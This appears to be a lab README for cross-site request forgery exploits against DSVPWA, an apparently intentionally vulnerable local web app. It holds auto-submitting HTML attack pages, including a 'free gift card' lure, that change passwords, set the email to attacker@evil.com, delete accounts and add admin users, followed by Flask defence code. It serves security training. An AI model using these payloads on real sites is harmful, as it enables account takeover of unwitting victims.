# DSVPWA - Cross-Site Request Forgery (CSRF) Exploits

## Overview
These exploits target CSRF vulnerabilities in DSVPWA's user settings and actions that lack proper anti-CSRF tokens.

## Target Application
- **Project**: DSVPWA
- **Port**: 65413
- **Vulnerable Features**: Settings updates, password changes, user actions
- **Vulnerability**: No CSRF protection, no anti-CSRF tokens

## Prerequisites
```bash
# Ensure DSVPWA is running
cd projects/DSVPWA
python app.py
# Access at: http://localhost:65413
```

## Exploits

### settings_csrf.html
HTML page that performs CSRF attack to modify user settings.

**Usage:**
```bash
# Step 1: Victim must be logged in to DSVPWA
# Step 2: Host the exploit HTML file
python3 -m http.server 8000

# Step 3: Get victim to visit:
# http://localhost:8000/settings_csrf.html

# The form will auto-submit, changing victim's settings
```

**What it does:**
- Contains a hidden form that targets DSVPWA's settings endpoint
- Auto-submits when the page loads using JavaScript
- Changes victim's email, password, or other settings
- Works because victim's session cookie is automatically sent

**Expected Outcome:**
```
[Victim's browser]
1. Victim logged in to http://localhost:65413
2. Victim visits attacker's page
3. Hidden form auto-submits to DSVPWA
4. Request includes victim's session cookie
5. Settings are modified without victim's knowledge
```

## Attack Scenarios

### 1. Password Change CSRF

Create `password_csrf.html`:
```html
<!DOCTYPE html>
<html>
<head><title>Free Gift Card!</title></head>
<body>
<h1>Claim Your Free $100 Gift Card!</h1>
<p>Loading...</p>

<form id="csrf" action="http://localhost:65413/change-password" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>

<script>
document.getElementById('csrf').submit();
</script>
</body>
</html>
```

### 2. Email Change CSRF

Create `email_csrf.html`:
```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
<form action="http://localhost:65413/update-profile" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
</body>
</html>
```

### 3. Delete Account CSRF

Create `delete_csrf.html`:
```bash
<!DOCTYPE html>
<html>
<body>
<img src="http://localhost:65413/delete-account?confirm=yes">
<p>Loading your content...</p>
</body>
</html>
```

### 4. Add Admin User CSRF (if victim is admin)

Create `add_admin_csrf.html`:
```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
<form action="http://localhost:65413/admin/add-user" method="POST">
    <input type="hidden" name="username" value="hacker">
    <input type="hidden" name="password" value="hacked123">
    <input type="hidden" name="role" value="admin">
</form>
</body>
</html>
```

## Advanced Techniques

### 1. JSON CSRF (if endpoint accepts JSON)

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://localhost:65413/api/settings');
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.withCredentials = true;  // Include cookies
xhr.send(JSON.stringify({
    email: 'attacker@evil.com',
    notifications: false
}));
</script>
```

### 2. CSRF with File Upload

```html
<form action="http://localhost:65413/upload-avatar" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="file" value="malicious.php">
</form>
```

### 3. Chaining CSRF with XSS

```html
<!-- If there's stored XSS, inject CSRF payload -->
<script>
var form = document.createElement('form');
form.action = 'http://localhost:65413/settings';
form.method = 'POST';

var input = document.createElement('input');
input.name = 'email';
input.value = 'pwned@evil.com';

form.appendChild(input);
document.body.appendChild(form);
form.submit();
</script>
```

### 4. CSRF with GET Requests

```html
<!-- If state-changing action uses GET (very bad practice) -->
<img src="http://localhost:65413/delete-user?id=123">
<iframe src="http://localhost:65413/promote-user?id=attacker&role=admin"></iframe>
```

## Testing CSRF Vulnerabilities

### Manual Test:
```bash
# 1. Login to DSVPWA normally
curl -c cookies.txt -X POST http://localhost:65413/login \
     -d "username=test&password=test123"

# 2. Try making state-changing request without CSRF token
curl -b cookies.txt -X POST http://localhost:65413/settings \
     -d "email=changed@example.com"

# If this succeeds, CSRF vulnerability exists!
```

### Automated Detection:
```python
import requests

# Login
session = requests.Session()
session.post('http://localhost:65413/login', data={
    'username': 'test',
    'password': 'test123'
})

# Try state-changing action
response = session.post('http://localhost:65413/settings', data={
    'email': 'test@example.com'
})

# Check if there's CSRF protection
if 'csrf' not in response.text.lower() and response.status_code == 200:
    print("[!] CSRF vulnerability found!")
```

## Defense Recommendations

### 1. Implement Anti-CSRF Tokens
```python
from flask import Flask, session, request
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

@app.route('/settings', methods=['POST'])
def update_settings():
    # Verify CSRF token
    token = request.form.get('csrf_token')
    if not token or token != session.get('csrf_token'):
        return "CSRF token invalid", 403
    
    # Process the request
    email = request.form.get('email')
    # ... update settings
    return "Settings updated"

# In template:
# <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
```

### 2. Use Flask-WTF (Automatic CSRF Protection)
```python
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField
from wtforms.validators import DataRequired

csrf = CSRFProtect(app)

class SettingsForm(FlaskForm):
    email = StringField('Email', validators=[DataRequired()])

@app.route('/settings', methods=['POST'])
def update_settings():
    form = SettingsForm()
    if form.validate_on_submit():  # Validates CSRF token automatically
        email = form.email.data
        # Update settings
    else:
        return "Invalid form", 400
```

### 3. SameSite Cookie Attribute
```python
from flask import Flask

app = Flask(__name__)

# Set SameSite attribute on session cookie
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # or 'Strict'
    SESSION_COOKIE_SECURE=True,     # HTTPS only
    SESSION_COOKIE_HTTPONLY=True    # No JavaScript access
)
```

### 4. Verify Referer Header
```python
from urllib.parse import urlparse

@app.route('/settings', methods=['POST'])
def update_settings():
    referer = request.headers.get('Referer')
    
    if not referer:
        return "No Referer header", 403
    
    referer_domain = urlparse(referer).netloc
    allowed_domain = urlparse(request.url_root).netloc
    
    if referer_domain != allowed_domain:
        return "Invalid Referer", 403
    
    # Process request
```

### 5. Re-authentication for Sensitive Actions
```python
@app.route('/change-password', methods=['POST'])
def change_password():
    # Require current password
    current_password = request.form.get('current_password')
    
    if not verify_password(current_password):
        return "Current password incorrect", 403
    
    # Change password
    new_password = request.form.get('new_password')
    update_password(new_password)
```

## Defense in Depth

```python
# Complete CSRF protection example
from flask import Flask, session, request, abort
from flask_wtf.csrf import CSRFProtect, generate_csrf
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# Enable CSRF protection
csrf = CSRFProtect(app)

# Configure session cookies
app.config.update(
    SESSION_COOKIE_SAMESITE='Strict',
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True  # HTTPS only in production
)

@app.route('/settings', methods=['POST'])
def update_settings():
    # CSRF token verified automatically by Flask-WTF
    
    # Additional: Verify Referer
    referer = request.headers.get('Referer', '')
    if not referer.startswith(request.url_root):
        abort(403)
    
    # Process request
    email = request.form.get('email')
    # ... update settings
    
    return "Success"

# Make CSRF token available to templates
@app.context_processor
def inject_csrf_token():
    return dict(csrf_token=generate_csrf)
```

## Notes
**WARNING**: CSRF attacks can:
- Change user passwords
- Modify account settings
- Perform unauthorized transactions
- Delete user data
- Add/modify content
- Escalate privileges (if victim is admin)

**Why CSRF is Dangerous:**
- Exploits user's authenticated session
- No user interaction needed (besides visiting a page)
- Can be combined with social engineering
- Invisible to the victim
- Can affect multiple users simultaneously

**Common Mistakes:**
- Only checking Referer header (can be bypassed)
- Using GET requests for state changes
- Only protecting against cross-origin requests (same-site CSRF exists)
- Trusting CORS headers (they don't prevent CSRF)
- Use proper CSRF tokens + SameSite cookies

## Related Exploits
- See `../xss/` for chaining CSRF with XSS
- See `../sqli/` for CSRF to execute SQL injection as admin
- Combine CSRF with other vulnerabilities for maximum impact

## References
- OWASP CSRF: https://owasp.org/www-community/attacks/csrf
- Flask-WTF: https://flask-wtf.readthedocs.io/
